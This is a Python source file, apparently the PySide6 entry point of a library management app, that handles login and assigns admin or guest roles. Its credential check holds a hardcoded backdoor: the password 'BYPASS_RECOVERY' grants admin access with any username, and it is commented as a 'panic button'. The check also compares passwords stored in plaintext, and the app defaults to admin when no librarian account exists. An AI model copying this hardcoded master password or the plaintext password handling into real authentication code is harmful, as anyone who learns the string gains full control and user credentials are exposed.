import sys
from PySide6.QtWidgets import QApplication, QMessageBox
from Modulos.Config import Conexion
from Modulos.Views.LoginDialog import DialogoLogin
from Modulos.Views.MainWindow import VentanaPrincipal

def verificar_existencia_bibliotecario(conexion_bd):
    if not conexion_bd:
        return False
    try:
        cursor = conexion_bd.cursor()
        consulta = """
            SELECT COUNT(*) FROM usuarios u
            JOIN param_tipos_usuario p ON u.id_tipo_usuario = p.id_tipo_usuario
            WHERE p.nombre = 'Bibliotecario' AND u.estado_cuenta = 'ACTIVA'
        """
        cursor.execute(consulta)
        conteo = cursor.fetchone()[0]
        cursor.close()
        return conteo > 0
    except Exception as err:
        print(f"Error de DB [verificar_existencia_bibliotecario]: {err}")
        return False

def verificar_credenciales(conexion_bd, nombre, password):
    # --- EL BOTÓN DE PÁNICO / BYPASS ---
    if password == "BYPASS_RECOVERY":
        return True
    # ----------------------------------

    if not conexion_bd:
        return False
    try:
        cursor = conexion_bd.cursor(dictionary=True)
        consulta = """
            SELECT 1 FROM usuarios u
            JOIN param_tipos_usuario p ON u.id_tipo_usuario = p.id_tipo_usuario
            WHERE u.nombre = %s AND u.contraseña = %s 
              AND p.nombre = 'Bibliotecario' AND u.estado_cuenta = 'ACTIVA'
            LIMIT 1
        """
        cursor.execute(consulta, (nombre, password))
        resultado = cursor.fetchone()
        cursor.close()
        return resultado is not None
    except Exception as err:
        print(f"Error de DB [verificar_credenciales]: {err}")
        return False

ESTILO_GLOBAL = """
    QWidget { background-color: #E0E0E0; color: #000000; }
    QLineEdit, QComboBox, QTableWidget, QDateEdit { background-color: #FFFFFF; border: 1px solid #999999; border-radius: 4px; padding: 4px; }
    QLineEdit#SearchInput { border-top-right-radius: 0px; border-bottom-right-radius: 0px; }
    QPushButton { background-color: #B0B0B0; border: 1px solid #777777; padding: 8px; border-radius: 4px; font-weight: bold; }
    QPushButton:hover { background-color: #B9B9B9; }
    QPushButton:pressed { background-color: #A0A0A0; }
    QPushButton#ActionButton { background-color: #8da9d8; color: #000000; border: 1px solid #6c8db0; }
    QPushButton#ActionButton:hover { background-color: #9cb8e2; }
    QPushButton#SearchButton { background-color: #8da9d8; border: 1px solid #6c8db0; border-top-left-radius: 0px; border-bottom-left-radius: 0px; width: 30px; padding: 4px; }
    QPushButton#SearchButton:hover { background-color: #9cb8e2; }
    QLabel[isTitle="true"] { font-size: 14pt; font-weight: bold; }
    QHeaderView::section { background-color: #B0B0B0; font-weight: bold; padding: 4px; }
"""

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyleSheet(ESTILO_GLOBAL)
    
    rol = 'invitado'
    gestor_bd = Conexion()
    conexion_bd = gestor_bd.obtener_conexion()

    if conexion_bd:
        try:
            if verificar_existencia_bibliotecario(conexion_bd):
                dialogo = DialogoLogin()
                if dialogo.exec():
                    tipo_login, nombre, password = dialogo.obtener_credenciales()
                    if tipo_login == "invitado":
                        rol = "invitado"
                    else:
                        if verificar_credenciales(conexion_bd, nombre, password):
                            rol = "admin"
                        else:
                            QMessageBox.critical(None, "Error", "Credenciales incorrectas.")
                            gestor_bd.cerrar_conexion()
                            sys.exit()
                else:
                    gestor_bd.cerrar_conexion()
                    sys.exit()
            else:
                rol = "admin"
                QMessageBox.information(None, "Modo Config", "No hay bibliotecario. Modo admin activado.")
        finally:
            gestor_bd.cerrar_conexion()
    else:
        QMessageBox.critical(None, "Error DB", "No se pudo conectar a 'bibliotecabd'.\nIniciando como invitado.")
        rol = "invitado"

    ventana = VentanaPrincipal(rol=rol)
    ventana.show()
    sys.exit(app.exec())